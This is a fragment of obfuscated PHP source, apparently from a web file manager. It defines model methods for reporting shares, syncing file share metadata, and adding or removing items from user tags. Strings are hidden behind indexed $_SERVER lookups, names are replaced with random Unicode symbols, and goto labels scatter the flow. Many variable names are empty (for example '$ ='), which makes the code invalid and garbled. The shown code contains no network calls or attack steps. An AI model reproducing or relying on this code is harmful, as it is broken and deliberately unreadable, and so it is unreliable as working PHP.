$թ[784], $թ[633]); if (!empty($[0])) { $ = $[0]; $ = array($թ[633] => array($թ[7], $)); $Ʋ = $this->where($)->field($թ[633])->select(); $Ʋ = array_to_keyvalue($Ʋ, $թ[12], $թ[633]); $Ț = array_diff($, $Ʋ); if (!empty($Ț)) { foreach ($[$թ[413]] as $ => $命) { if (in_array($命[$թ[633]], $Ț)) { unset($[$թ[413]][$]); } } } } $this->_listDataApply($[$թ[413]]); return $; } public function reportStatus($ȼ) { $Üȴ =& $_SERVER[]; $ = array($Üȴ[443] => $ȼ[$Üȴ[443]]); $ = Model($Üȴ[2054])->where($)->field($Üȴ[2063])->find(); if (!$) { return !1; } $ߟ = array($Üȴ[784] => $ȼ[$Üȴ[784]]); if ($ȼ[$Üȴ[784]] == $Üȴ[2059] && $[$Üȴ[784]] == $Üȴ[2059]) { $ߟ[$Üȴ[784]] = 0; } $ﰃ = Model($Üȴ[2054])->where($)->save($ߟ); if ($ȼ[$Üȴ[784]] == $Üȴ[478]) { if ($[$Üȴ[509]] != $Üȴ[212] && $this->shareFileMeta($[$Üȴ[509]])) { $this->shareFileMeta($[$Üȴ[509]], 0); } $this->remove($[$Üȴ[633]]); return !0; } if ($ﰃ && $ȼ[$Üȴ[784]] == $Üȴ[2059]) { $配 = $ߟ[$Üȴ[784]] == $Üȴ[2059] ? 1 : 0; $this->shareFileMeta($[$Üȴ[509]], $配); $this->removeByFile($[$Üȴ[509]]); } return $ﰃ; } private function removeByFile($ȼ) { $󀃦 =& $_SERVER[]; $͓ = Model($󀃦[859])->where(array($󀃦[509] => $ȼ))->field($󀃦[181])->select(); $ҏ = array_to_keyvalue($͓, $󀃦[12], $󀃦[181]); $㜷 = array($󀃦[181] => array($󀃦[7], $ҏ), $󀃦[530] => 1); $͓ = $this->where($㜷)->field($󀃦[633])->select(); if (empty($͓)) { return; } $Ę = array_to_keyvalue($͓, $󀃦[12], $󀃦[633]); $this->remove($Ę); } private function shareFileMeta($؂, $ʥ = null) { $č =& $_SERVER[]; $ = array($č[509] => $؂, $č[94] => $č[2064]); if (is_null($ʥ)) { return Model($č[2065])->where($)->find(); } $[$č[418]] = $ʥ; Model($č[2065])->add($, array(), !0); } } goto A; D: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($É) { $Ց =& $_SERVER[]; return array($Ց[1996] => array($Ց[2385] . USER_ID, $Ց[1997])); } protected function listData() { $١ =& $_SERVER[]; $ = array($١[1678] => USER_ID, $١[525] => array($١[2000], 0)); $ᑳ = $١[2386]; $ = $this->field($ᑳ)->where($)->order($١[2003])->select(); return $ ? $ : array(); } protected function addToTag($, $Ǳ) { $޻ =& $_SERVER[]; if (!Model($޻[2145])->listData($Ǳ)) { return !1; } if (is_numeric($)) { $Ӱ = Model($޻[859])->pathInfo($); if (!$Ӱ) { return !1; } } else { $Ӱ = IO::infoSimple($); if (!$Ӱ) { return !1; } $ = $Ӱ[$޻[32]]; $Ј = $Ӱ[$޻[33]]; if (isset($Ӱ[$޻[453]])) { $Ј = $Ӱ[$޻[453]] == $޻[88] ? $޻[75] : $޻[214]; } } $ܮ = array($޻[1678] => USER_ID, $޻[525] => $Ǳ, $޻[463] => $, $޻[464] => $Ј ? $Ј : $޻[458], $޻[462] => $ ? $ : $޻[12], $޻[1889] => 0); if ($this->where($ܮ)->find()) { return !1; } return $this->add($ܮ); } protected function removeFromTag($ԼӁ, $˳) { $ =& $_SERVER[]; if (!Model($[2145])->listData($˳)) { return !1; } if (is_array($ԼӁ)) { $ԼӁ = array($[7], $ԼӁ); } $ = array($[1678] => USER_ID, $[525] => $˳, $[463] => $ԼӁ); return $this->where($)->delete(); } protected function removeByTag($פ) { $ =& $_SERVER[]; if (!$פ) { return !1; } $ = array($[1678] => USER_ID, $[525] => $פ); return $this->where($)->delete(); } protected function removeBySource($ܑ) { $ǫ =& $_SERVER[]; if (is_array($ܑ)) { $ܑ = array($ǫ[7], $ܑ); } $· = array($ǫ[1678] => USER_ID, $ǫ[525] => array($ǫ[1053], 0), $ǫ[463] => $ܑ); return $this->where($·)->delete(); } }